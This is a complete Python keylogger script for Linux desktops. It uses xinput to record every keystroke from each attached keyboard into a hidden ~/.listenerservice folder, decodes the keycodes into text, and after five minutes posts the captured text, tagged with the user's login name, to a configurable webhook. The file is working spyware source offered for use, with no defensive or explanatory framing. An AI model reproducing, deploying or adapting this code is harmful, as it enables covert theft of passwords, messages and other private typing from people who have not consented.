import os
import sys
import subprocess
import shutil
import datetime
from threading import Thread
import requests
import json

webhookUrl = "" # Replace with your webhook URL.

mapping={49: '`', 9: ' ESC ', 67: ' F1 ', 68: ' F2 ', 69: ' F3 ', 70: ' F4 ', 71: ' F5 ', 72: ' F6 ', 73: ' F7 ', 74: ' F8 ', 75: ' F9 ', 76: ' F10 ', 95: ' F11 ', 96: ' F12 ', 10: '1', 11: '2', 12: '3', 13: '4', 14: '5', 15: '6', 16: '7', 17: '8', 18: '9', 19: '0', 20: '-', 21: '=', 22: ' BACKSPACE ', 23: ' TAB ', 24: 'q', 25: 'w', 26: 'e', 27: 'r', 28: 't', 29: 'y', 30: 'u', 31: 'i', 32: 'o', 33: 'p', 34: '[', 35: ']', 37: ' RCTRL ', 51: '\\', 38: 'a', 39: 's', 40: 'd', 41: 'f', 42: 'g', 43: 'h', 44: 'j', 45: 'k', 46: 'l', 47: ';', 48: "'", 36: ' ENTER ', 50: ' LSHIFT ', 52: 'z', 53: 'x', 54: 'c', 55: 'v', 56: 'b', 57: 'n', 58: 'm', 59: ',', 60: '.', 61: '/', 62: ' RSHIFT ', 64: ' LALT ', 65: ' SPACE ', 105: ' LCTRL ', 108: ' RALT ', 107: " PRINTSCRN ", 78: " SCROLLLOCK ", 127: " PAUSEBREAK ", 118: " INS ", 110: " HOME ", 112: " PGUP ", 117: " PGDWN ", 115: " END ", 199: " DEL ", 111: " UPARROW ", 116: " DOWNARROW ", 113: " LEFTARROW ", 114: " RIGHTARROW ", 133: " SUPER "}

processes=[]

def send(keyboardID, username, d):
    try:
        d=d.decode()
    except:
        pass
    if len(d.strip())==0:
        return
    while True:
        d=d.replace('\\','')
        data={"content": json.dumps({'username': username, 'keyboardID': keyboardID, 'data': d[0:1501], 'time': str(datetime.datetime.now())})}
        try:
            response = requests.post(webhookUrl, json=data)
            if response:
                print('[LOG] Data sent successfully to webhook.')
            else:
                print('[FAILED] Could not send data to webhook. Error: {}'.format(response.content))
        except Exception as err:
            print('[ERROR] Could not send data to webhook. Error: {}'.format(str(err)))
        if len(d)>=1500:
            d=d[1501:]
        else:
            break

def stayalive():
    print('doing something')
    start=datetime.datetime.now()
    while True:
        print('running', (datetime.datetime.now()-start).total_seconds())
        if (datetime.datetime.now()-start).total_seconds() > 300:
            speak(1)
            break

def listen():
    global processes
    try:
        os.mkdir(os.path.expanduser("~")+"/.listenerservice")
    except:
        pass
    os.system('rm /tmp/keyboardinfo')
    os.system("xinput > /tmp/keyboardinfo")
    keyboards=[]
    with open("/tmp/keyboardinfo", 'r') as f:
        lines=f.readlines()
    os.remove("/tmp/keyboardinfo")
    for line in lines:
        try:
            if "keyboard" in line.replace("[slave  keyboard", '').lower() and "slave  keyboard" in line.lower() and "id" in line:
                for words in line.strip().split(" "):
                    if "id" in words.strip():
                        i=words.split("=")[-1].split("[")[0]
                        try:
                            i=int(i)
                            keyboards.append(i)
                        except:
                            pass
        except:
            pass
    for keyboard in keyboards:
        print("[LOG] Listening to {}".format(keyboard))
        processes.append(subprocess.Popen(['xinput test {} >> {}/.listenerservice/.listened{}'.format(keyboard, os.path.expanduser("~"), keyboard)], shell=True))
        
def speak(sendtoserver=0):
    if os.geteuid==0:
        return
    files=[]
    try:
        for f in os.listdir(os.path.expanduser("~/.listenerservice")):
            if "listened" in f:
                files.append(f)
    except:
        print('[FAILED] Nothing in logs')
        return
    if files==[]:
        print("[ERROR] Listen first")
    for f in files:
        output=''
        with open(os.path.expanduser("~")+"/.listenerservice/"+f) as foperator:
            for line in foperator.readlines():
                if "press" in line.strip():
                    try:
                        if mapping[int(line.strip().split(" ")[-1])].strip()=="ENTER":
                            output+=mapping[int(line.strip().split(" ")[-1])]
                            output+="\n"
                        else:
                            output+=mapping[int(line.strip().split(" ")[-1])]
                    except:
                        pass
        if sendtoserver!=0:
            send(f.lstrip('.listened'), os.getlogin(), output)
        else:
            output+="\n\nEND OF FILE\n\n"
            print("\nFrom keyboard {}\n".format(f.lstrip('.listened')))
            print(output)

args=sys.argv[1:]
if len(args) == 0:
    args.append('listen')
for arg in args:
    if arg.lower().strip()=="listen":
        print("[LOG] Listening")
        thrd=Thread(target=stayalive)
        thrd.start()
        listen()
    elif arg.lower().strip()=="speak":
        print("[LOG] Opening listened log")
        speak()
    elif arg.lower().strip()=="clean":
        try:
            shutil.rmtree(os.path.expanduser("~")+"/.listenerservice")
        except:
            pass
    else:
        print("[ERROR] Invalid argument")
        exit()
